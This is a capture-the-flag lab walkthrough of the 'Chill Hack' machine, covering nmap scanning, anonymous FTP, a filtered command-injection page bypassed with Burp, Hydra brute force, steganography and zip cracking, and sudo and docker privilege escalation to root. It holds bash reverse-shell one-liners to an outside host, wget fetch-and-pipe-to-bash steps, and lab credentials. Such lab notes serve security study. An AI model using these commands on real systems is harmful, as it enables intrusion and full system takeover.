# Chill Hack

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

Walkthrough: https://polygonben.github.io/ctf%20writeups/Chill-Hack/

## Step 1: Visit the Webpage

- "Contact" page has a message field: possible injection

- ON the Contact page, tried submitting easy XSS

```text
:><script>alert('XSS');</script>
```

- No results

- No robots.txt

## STEP 2: Nmap

## > nmap -Pn 10.10.184.228

```text
#######################################################################
```

## Port State Service

21/tcp open ftp

22/tcp open ssh

80/tcp open http

```text
#######################################################################
```

## STEP 3: Nmap SERVICES

```text
:> nmap -Pn -sV 10.10.184.228
#######################################################################
```

## Port State Service Version

21/tcp open ftp vsftpd 3.0.3

22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open http Apache httpd 2.4.29 ((Ubuntu))

```text
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
#######################################################################
```

## Step 4: Common Directory Enumeration

```text
:>dirb HTTP://10.10.184.228 /usr/share/wordlists/dirb/common.txt
#####################################################################
```

- Scanning URL: http://10.10.126.2:80/ ----

==> DIRECTORY: http://10.10.126.2:80/css/

==> DIRECTORY: http://10.10.126.2:80/fonts/

==> DIRECTORY: http://10.10.126.2:80/images/

+ http://10.10.126.2:80/index.html (CODE:200|SIZE:35184)

==> DIRECTORY: http://10.10.126.2:80/js/

==> DIRECTORY: http://10.10.126.2:80/secret/

+ http://10.10.126.2:80/server-status (CODE:403|SIZE:276)

```text
#####################################################################
```

## STEP 5: Nmap VULNERABILITIES

```text
:>nmap -Pn -sC 10.10.184.228
#######################################################################
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-10 07:49 CDT
```

Nmap scan report for 10.10.184.228

```text
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
```

## Port State Service

21/tcp open ftp

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

```text
|_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt
```

| ftp-syst:

## | Stat

| FTP server status:

| Connected to ::ffff:10.2.29.130

| Logged in as ftp

## | Type: Ascii

| No session bandwidth limit

| Session timeout in seconds is 300

| Control connection is plain text

| Data connections will be plain text

| At session startup, client count was 2

| vsFTPd 3.0.3 - secure, fast, stable

```text
|_End of status
```

22/tcp open ssh

| ssh-hostkey:

| 2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)

| 256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)

```text
|_ 256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
```

80/tcp open http

```text
|_http-title: Game Info
#######################################################################
```

## STEP 6: Visit "secret" directory found by dirb

- has a command input box

```text
:>whoami
```

- "www-data"

```text
:>pwd
```

- /var/www/html/secret

```text
:>cat /etc/passwd
```

- receives a "warnign" and lets the command fail

```text
:>ls /home/
```

- another warning and no output

```text
:> id
```

- uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Step 7: Attempt One-line Bash Reverse Shell

```text
:> bash -i >& /dev/tcp/10.2.29.130/45450>&1
```

- did not work

## Step 8: Attempt Useradd

```text
:> useradd guest02 -p guest02
```

- did not receive ther warning / hacker page

```text
:>usermod -aG wheel guest02
```

- no warning/hacker page

```text
:>whoami
```

- still says www-data

## STEP 9: Attempted one line bash commands to avoid filtering

```text
:> echo "pwd" | bash
:> bash -c "$(echo "pwd")"
:>eval"$(echo "pwd")"
```

- Nothing worked

## STEP 10: ANONYMOUS FTP LOGIN BASED ON RESULTS OF Nmap -sC SCAN

```text
:> ftp 10.10.128.44
```

Connected to 10.10.128.44.

220 (vsFTPd 3.0.3)

### Name (10.10.128.44:kidh4kerus): anonymous

331 Please specify the password.

## Password

230 Login successful.

Remote system type is UNIX.

### Using binary mode to transfer files.

```text
ftp> ls
```

## 229 Entering Extended Passive Mode (|||36530|)

150 Here comes the directory listing.

- rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt

226 Directory send OK.

```text
:> ls -alh
```

- reveals file: note.txt

```text
:> get note.txt
:> cat note.txt
```

Anurodh told me that there is some filtering on strings being put in the command -- Apaar

- two usernames: Anurodh, Apaar

## Step 11: Enumerate The Web Stack

```text
:> whatweb 10.10.128.44
```

http://10.10.128.44 [200 OK]

## Apache[2.4.29],

Bootstrap, Country[RESERVED][ZZ], Email[demo@gmail.com], Frame,

## Html5,

## HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.128.44],

## JQuery[1.11.1],

## Script, Title[Game Info], X-UA-Compatible[IE=edge]

## Step 12: Wget

- wget works on the "secret" page.

```text
:>python3 -m http.server
```

- start python server

- create test.txt file with test string

```text
:>wget http://10.2.29.130:8000/test.txt
```

- file uploaded

- tried to "ls" the secret page, but did not work.

- tried ftp again to see if the file was saved to the same folder as the ftp default... nope

tried pulling up test.txt by uri

http://10.10.66.21/secret/test.txt

- no effect

## Step 13: Hydra FTP Attack

```text
:> hydra ftp://10.10.66.21 -L unames.txt -P /usr/share/wordlists/rockyou.txt
```

- No Luck

## Step 14: Hydra SSH Attack

```text
:>hydra 10.10.66.21 ssh -L unames.txt -P /usr/share/wordlists/rockyou.txt
```

- Nothing

## Step 15: Try Another Reverse Shell

- found additional information

- might still be able to use secret page to reverse shell

- start netcat listener

```text
:> nc -lvnp 4545
```

input to secret page:

```text
:>echo "/bin/bash -i >& /dev/tcp/10.2.29.130/4545 0>&1" > revshell.sh
```

- didn't work

## Step 16: Upload And Exploit Reverse Shell

- CREATE REVSHELL.SH with single line bash reverse shell

- use chmod 777

- start python server

- start netcat listener on port 4545

- upload shell on secret page

- everything works fine

- :> cat $temp/revshell.sh

```text
:> cat $TEMP/revshell.sh | bash
:> cat /tmp/revshell.sh | bash
```

- nothing workd

- try again, slightly differently

```text
:>wget http://10.2.29.130:8000/test01.sh -O /tmp/test01.sh
```

- that sees to have worked

- causing the file to be read was impossible.

## STEP 17: EMPLOY Burp Suite ON THE SECRET PAGE

- "cat" command is blocked

- used Burp Suite to intercept commands and modify

- send command "id"

- intercepted in Burp Suite proxy

- syntax was very important couldn't have spaces except after the cat command

- changed to: id;cat /tmp/test01.sh|bash

- this provided the reverse shell initial foothold

## Step 17: Check Sudo Privileges

```text
:>sudo -l
```

Matching Defaults entries for www-data on ubuntu:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:

(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

www-data@ubuntu:/var/www/files$

## Step 18: Investigate .helpline

```text
:>cd /home/apaar/
:>ls -alh
```

## total 44K

```text
drwxr-xr-x 5 apaar apaar 4.0K Oct 4 2020 .
drwxr-xr-x 5 root root 4.0K Oct 3 2020 ..
```

- rw------- 1 apaar apaar 0 Oct 4 2020 .bash_history

- rw-r--r-- 1 apaar apaar 220 Oct 3 2020 .bash_logout

- rw-r--r-- 1 apaar apaar 3.7K Oct 3 2020 .bashrc

```text
drwx------ 2 apaar apaar 4.0K Oct 3 2020 .cache
drwx------ 3 apaar apaar 4.0K Oct 3 2020 .gnupg
```

- rwxrwxr-x 1 apaar apaar 286 Oct 4 2020 .helpline.sh

- rw-r--r-- 1 apaar apaar 807 Oct 3 2020 .profile

```text
drwxr-xr-x 2 apaar apaar 4.0K Oct 3 2020 .ssh
```

- rw------- 1 apaar apaar 817 Oct 3 2020 .viminfo

- rw-rw---- 1 apaar apaar 46 Oct 4 2020 local.txt

```text
:>cat .helpline
#!/bin/bash
```

echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person, Please enter your message: " msg

```text
$msg 2>/dev/null
```

echo "Thank you for your precious time!"

## Explanation

- The first read line takes in a name for purpose of display.

- second read line takes input, but does not limit the type of input. A command can be set into the msg variable and execute

- the www-data user can execute this script as apaar to read the local.txt file.

```text
:> sudo -u apaar /home/apaar/.helpline
```

- first input is any text

- second input cat /home/apaar/local.txt

- reveals the flag

Next is to run it again and use /bin/bash as the second input to spawn a shell as apaar and find a way to escalate from there.

## STEP 19: Assume Apaar ID

```text
:> sudo -u apaar /home/apaar/.helpline
```

- first input is any text

- second input /bin/bash

```text
:> python3 -c "import pty;pty.spawn('/bin/bash')"
```

## Step 20: Investigate Apaar

```text
:>sudo -l
```

- nothing useful

- tried a bunch of find comme

- first input is any text

- Check for SUID permissions:

```text
:> find / -perm -u=s -type f 2>/dev/null
```

/usr/lib/openssh/ssh-keysign

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

/usr/lib/snapd/snap-confine

/usr/lib/policykit-1/polkit-agent-helper-1

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/eject/dmcrypt-get-device

/usr/bin/sudo

/usr/bin/newgidmap

/usr/bin/gpasswd

/usr/bin/newuidmap

/usr/bin/traceroute6.iputils

/usr/bin/newgrp

/usr/bin/pkexec

/usr/bin/passwd

/usr/bin/at

/usr/bin/chfn

/usr/bin/chsh

/bin/su

/bin/mount

/bin/fusermount

/bin/ping

/bin/umount

```text
:> find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

- rwsr-xr-x 1 root root 436552 Mar 4 2019 /usr/lib/openssh/ssh-keysign

- rwsr-xr-x 1 root root 100760 Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

- rwsr-xr-x 1 root root 113528 Jul 10 2020 /usr/lib/snapd/snap-confine

- rwsr-xr-x 1 root root 14328 Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1

- rwsr-xr-- 1 root messagebus 42992 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

- rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device

- rwsr-xr-x 1 root root 149080 Jan 31 2020 /usr/bin/sudo

- rwsr-xr-x 1 root root 37136 Mar 22 2019 /usr/bin/newgidmap

- rwsr-xr-x 1 root root 75824 Mar 22 2019 /usr/bin/gpasswd

- rwsr-xr-x 1 root root 37136 Mar 22 2019 /usr/bin/newuidmap

- rwsr-xr-x 1 root root 18448 Jun 28 2019 /usr/bin/traceroute6.iputils

- rwsr-xr-x 1 root root 40344 Mar 22 2019 /usr/bin/newgrp

- rwsr-xr-x 1 root root 22520 Mar 27 2019 /usr/bin/pkexec

- rwsr-xr-x 1 root root 59640 Mar 22 2019 /usr/bin/passwd

- rwsr-xr-x 1 root root 76496 Mar 22 2019 /usr/bin/chfn

- rwsr-xr-x 1 root root 44528 Mar 22 2019 /usr/bin/chsh

- rwsr-xr-x 1 root root 44664 Mar 22 2019 /bin/su

- rwsr-xr-x 1 root root 43088 Sep 16 2020 /bin/mount

- rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount

- rwsr-xr-x 1 root root 64424 Jun 28 2019 /bin/ping

- rwsr-xr-x 1 root root 26696 Sep 16 2020 /bin/umount

```text
:> cd /var/www/files
:> cat index.php
```

- found a line: " $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");"

- a connection, username, and password to a database

```text
:> cat hacker.php
```

- foudn this line: "<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>"

- indicates steganography

## Step 21: Investigate The Image

changed to the folder with the images and set up a python server

```text
:>python3 -m http.server
```

From my attacking machine

```text
:>wget http://10.10.91.150:8000/hacker-with-laptop_23-2147985341.jpg
```

- the image downloaded

- never mess with the original

```text
:>cp hacker-with-laptop_23-2147985341.jpg hacker.jpg
:>exiftool hacker.jpg
```

- nothing

```text
:> strings hacker.jpg
```

- nothing

```text
:>binwalk hacker.jpg
```

- nothing

```text
:> steghide extract -sf hacker.jpg
```

## Enter passphrase

wrote extracted data to "backup.zip".

note: used empty passphrase

## Step 22: Investigate Backup.zip

```text
:>unzip backup.zip
```

Archive: backup.zip

[backup.zip] source_code.php password:

skipping: source_code.php incorrect password

- need a password

```text
:> zip2john backup.zip > backup.txt
```

ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8

```text
:>john --wordlist=/usr/share/wordlists/rockyou.txt backup.txt
```

### Using default input encoding: UTF-8

Loaded 1 password hash (PKZIP [32/64])

Will run 4 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

pass1word (backup.zip/source_code.php)

1g 0:00:00:00 DONE (2024-04-11 18:14) 33.33g/s 546133p/s 546133c/s 546133C/s total90..cocoliso

Use the "--show" option to display all of the cracked passwords reliably

```text
:> unzip backup.zip
```

Archive: backup.zip

[backup.zip] source_code.php password:

inflating: source_code.php

- read the source_code.php and found the lines:

if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")

## echo "Welcome Anurodh!";

- we have username and password

```text
:> echo IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 --decode
```

!d0ntKn0wmYp@ssw0rd

## Step 23 Traverse Users

from attacking machine:

```text
:> ssh anurodhl@10.10.91.150
```

Warning: Permanently added '10.10.91.150' (ED25519) to the list of known hosts.

anurodhl@10.10.91.150's password:

Permission denied, please try again.

- did not work

From the reverse shell, acting as apaar still

```text
:> su anurodh --login
```

Password: !d0ntKn0wmYp@ssw0rd

worked

## Step 24: Investigate Anurodh

nothing in history

nothing special using typical "find" searches

```text
:> sudo -l
```

Matching Defaults entries for anurodh on ubuntu:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ubuntu:

(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

```text
:>id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

## Step 25: Investigate Docker

```text
:> docker image ls
```

## Repository Tag Image Id Created Size

alpine latest a24bb4013296 3 years ago 5.57MB

hello-world latest bf756fb1ae65 4 years ago 13.3kB

```text
:> docker ps -a
```

## Container Id Image Command Created Status Ports Names

9b859d23108f hello-world "/hello" 3 years ago Exited (0) 3 years ago quizzical_perlman

Refernece: https://keiran.scot/2020/07/05/privilege-escalation-with-docker/

```text
:> docker run -it -v /:/mnt alpine chroot /mnt sh
```

- mount the full file system

- use chroot to gain full privileges

```text
:>whoami
```

root
